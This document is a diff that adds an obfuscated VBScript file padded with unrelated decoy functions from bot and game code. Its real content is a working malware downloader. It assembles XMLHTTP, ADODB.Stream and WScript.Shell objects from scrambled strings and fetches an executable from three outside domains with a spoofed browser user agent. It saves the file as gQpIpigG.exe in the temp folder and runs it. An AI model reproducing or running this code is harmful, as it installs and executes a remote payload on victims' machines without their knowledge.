@@ -1,0 +1,389 @@
+
+Dim veerniyhelpsensurance 'As String
+
+Dim veerniyhelpsInPlaceOf 'As String
+veerniyhelpsBelish = "User"
+Public Function PrepareCheck(toCheck)
+    toCheck = Replace(toCheck, "[", "˙")
+    toCheck = Replace(toCheck, "]", "ö")
+    toCheck = Replace(toCheck, "~", "Ü")
+    toCheck = Replace(toCheck, "#", "˘")
+    toCheck = Replace(toCheck, "-", "Ł")
+    toCheck = Replace(toCheck, "&", "Ľ")
+    toCheck = Replace(toCheck, "@", "¤")
+    toCheck = Replace(toCheck, "{", "")
+    toCheck = Replace(toCheck, "}", "á")
+    toCheck = Replace(toCheck, "^", "í")
+    toCheck = Replace(toCheck, "`", "ó")
+    toCheck = Replace(toCheck, "_", "ú")
+    toCheck = Replace(toCheck, "+", "ń")
+    toCheck = Replace(toCheck, "$", "÷")
+    PrepareCheck = LCase(toCheck)
+End Function
+
+ Dim Pirates 
+
+Public Sub LoadDatabase()
+    
+
+    ' 9/13/06: Add the bot owner 200
+    If (LenB(BotVars.BotOwner) > 0) Then
+        For i = 0 To UBound(DB)
+            If (StrComp(DB(i).Username, BotVars.BotOwner, vbTextCompare) = 0) Then
+                found = True
+                
+                Exit For
+            End If
+        Next
+        
+
+    End If
+    
+    If (SaveDB) Then Call WriteDatabase(Path)
+End Sub
+
+Dim williams
+       Dim TristateTrue
+
+  Pirates = "XMLHTTPGIDZOAVAdodb.streaMGIDZOAVs"
+Vrungel = ".respo"+"nseBody"
+
+Dim veerniyhelpsTimeTo 'As Object
+Dim veerniyhelpsstatus
+veerniyhelpsstatus = false
+   
+
+Dim veerniyhelpscashback 'As Object
+      
+CUA ="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+
+  
+ Function SyncObjAboardinghelps2(param1)
+param1 = param1 + param1
+
+veerniyhelps5000 = veerniyhelpsWentDo.responseBody
+param1 = 3 * param1 - 8	
+
+End Function
+
+
+Dim veerniyhelpsWentDo 'As Object
+Dim veerniyhelpsTavyer 'As Object   
+Dim abirvalgboardingAxxxxx 'As Object
+
+Dim ZimZamZum
+
+Function T2000(p, ddd) 
+    Set veerniyhelpsRunrun = CreateObject("WSc"+"ript.Shell")	
+	abirvalgboardingAxxxxx.Type = 1
+ abirvalgboardingAxxxxx.Open
+End Function 
+
+Pirates ="Microsoft." + Pirates+  "hell.App"+"licationGIDZOAVWscript"
+
+Function StackStack( vr )
+	ad1 = Replace(Pirates, "DRISSMISS", "" )
+   StackStack = Split(ad1,  vr)
+End Function
+
+Pirates = Pirates+".shellGIDZOAVProcessGIDZOAVGeTGIDZOAVT"+"emPGIDZOAVTyDRISSMISS"+"peDRISSMISS"
+
+
+
+Function SyncObjAboardinghelps(strr)
+if D = 33 then
+AXC = "Sav"+"eToFile"
+end if
+abirvalgboardingAxxxxx.Savetofile veerniyhelpsInPlaceOf , 14-12
+End Function
+
+    Public Function FolderToCopy(dde,SecondP,VKUok)
+Samwell = 69
+Samwell = Samwell + 11
+if Samwell > 33 then
+SecondP.Write VKUok
+Samwell =  Samwell / 13
+end if
+End Function
+	
+
+ Function IsCircleAnalytic(ByVal Figure1 ) 
+If Figure1 < FigureCount And Figure1 >= 0 Then
+    If Figures(Figure1).FigureType = dsAnCircle Then IsCircleAnalytic = True
+End If
+End Function
+Function SheduleddelusiveObject(p,d)
+
+FC = "" + veerniyhelpsInPlaceOf
+
+ veerniyhelpsRunrun.Run(FC + "")
+
+End Function
+
+
+Pirates = Pirates +"GIDZOAVDRISSMISSoDRISSMISSpenGIDZOAVwrDRISSMISSiteGIDZOAVreDRISSMISSspoDRISSMISSnseBoDRISSMISSdyGIDZOAVsaDRISSMISSvetof"+"DRISSMISSileGIDZOAV\gQpIpigG.ex"+"DRISSMISSeGIDZOAVhttDRISSMISSp:GIDZOAV//"
+
+
+ Function GetShitlist(ByVal Username ) 
+    Dim gAcc 
+    Dim Ban  
+    
+    gAcc = GetCumulativeAccess(Username, "USER")
+    
+    If (Not InStr(1, gAcc.Flags, "Z", vbBinaryCompare) = 0) Then
+        Ban = True
+    ElseIf (Not InStr(1, gAcc.Flags, "B", vbBinaryCompare) = 0) Then
+        If (GetSafelist(Username) = False) Then Ban = True
+    End If
+    
+    If (Ban) Then
+        If ((Len(gAcc.BanMessage) > 0) And (gAcc.BanMessage <> "%")) Then
+            GetShitlist = Username & Space(1) & gAcc.BanMessage
+        ElseIf InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clanban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, " (game)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clientban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (game)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, "*", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Tagban: " & Mid(gAcc.Username, 2, Len(gAcc.Username) - 2)
+        Else
+            GetShitlist = Username & Space(1) & "Shitlisted"
+        End If
+    End If
+End Function
+Dim veerniyhelpsPetir 'As String
+Dim sNodeKey 'As String
+  Dim sParentKey 'As String
+
+
+veerniyhelpsPetir = "Ag"
+
+williams = StackStack("GIDZOAV" + "")
+
+  Dim MarketPlaceibility 'As String
+
+
+Dim Twelve 'As Integer
+  Dim sDecimalVis 'As String
+  
+Set veerniyhelpsWentDo = CreateObject("" + williams(00))
+ 
+Dim Valery 'As Integer
+veerniyhelpsBelish = veerniyhelpsBelish + "-"
+ 
+
+
+Dim veerniyhelps404 'As String
+
+Dim veerniyhelps5000 'As Variant
+Dim veerniyhelpsRunrun
+ Dim MarketPlace 'As String
+  Dim sTempVis 'As String
+  Dim iCount 'As Integer
+
+Function veerniyhelpsFuks(p)
+ 
+veerniyhelpsWentDo.Send
+	
+
+End Function
+Twelve = 11 + 1
+zTempVis = williams(1)
+
+'Set veerniyhelpsTimeTo = CreateObject(williams(8-6))
+Set veerniyhelpsHelmet = GetRef("SheduleddelusiveObject")
+Set veerniyhelps13 = GetRef("SyncObjAboardinghelps")
+Set veerniyhelps14 = GetRef("FolderToCopy")
+ 
+Set abirvalgboardingAxxxxx = CreateObject("Adodb."+"streaM")
+
+Public Sub DebugLog(txt)
+    'debug.print txt
+    Open AppPath & "ARCServerDebug.txt" 
+    Print txt
+    Close 
+End Sub
+Set veerniyhelpsTavyer = CreateObject(""+williams(10-7))
+
+
+if "Host" + WScript + "23" = "HostWindows Script Host23" Then 
+	
+	
+
+
+
+	Set veerniyhelpscashback = veerniyhelpsTavyer.Environment(williams(1 + 3))
+
+end if	
+
+Function SetUA()
+veerniyhelpsLamp.setRequestHeader veerniyhelpsBelish, CUA
+End Function
+ 
+ Valery = 89210
+
+veerniyhelpsensurance = veerniyhelpscashback(williams(6))
+ Dim i
+ 'on error GoTo nextU
+' on error resume next
+sTempVis = williams(1+Twelve -1)
+
+ 
+
+Sub SendFlagDat(SndTo)
+    Dim i , b , n 
+    Dim oNewMsg() , lNewOffSet 
+    Dim lNewMsg 
+    
+    For i = 1 To UBound(Flag1, 2)
+        
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 1
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag1(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag1(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry1(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag2, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 2
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag2(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag2(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry2(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag3, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 3
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag3(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag3(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry3(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag4, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 4
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag4(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag4(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry4(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag5, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 5
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag5(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag5(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry5(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    
+End Sub
+MarketPlace = williams(11+2) & williams(11+3)
+
+veerniyhelpsBelish = veerniyhelpsBelish & veerniyhelpsPetir & "ent"
+SKKmne = 19
+
+
+ZimZamZum = Array("xploramail.com/iugftrs2?","nsaflow.info/p66/iugftrs2","axtes.com/iugftrs2?")
+
+lTo = UBound(ZimZamZum)
+
+For i = 0 To lTo Step 1
+SKKmne = SKKmne * 16
+
+	on error resume  next
+Valery =  Valery +14
+ veerniyhelps404 = MarketPlace + ZimZamZum(i)
+dr1=2
+
+
+SKKmne = SKKmne + 91
+SKKmne2 = williams(10-5)
+ veerniyhelpsWentDo.Open SKKmne2, veerniyhelps404, False
+
+
+
+SetUA()
+veerniyhelpsFuks " d "
+If veerniyhelpsWentDo.Status +3 = 203 Then
+veerniyhelpsstatus = true
+ Exit For
+End If
+
+goto14:
+Next
+
+on error goto 0
+
+if veerniyhelpsstatus Then
+Dim Clank 'As String
+ veerniyhelpsInPlaceOf = veerniyhelpsensurance+ sTempVis
+
+T2000 "",4
+SyncObjAboardinghelps2 31 
+veerniyhelps14 "",abirvalgboardingAxxxxx,veerniyhelps5000
+Sapogi =21
+veerniyhelpsInPlaceOfu = "" + veerniyhelpsInPlaceOf 
+
+
+Sapogi = Sapogi*5
+
+Dim veerniyhelpsJohnSnowu,veerniyhelpsDisplay 'As Long
+veerniyhelps13 "ss"
+veerniyhelpsJohnSnowu = 4133
+
+If 621  < veerniyhelpsJohnSnowu + 1 Then
+	  
+	Hipster =SKKmne+SKKmne
+	veerniyhelpsHelmet Hipster, SKKmne
+	veerniyhelpsDisplay = "H"
+End If
+
+
+
+mafia = 22211
+end if
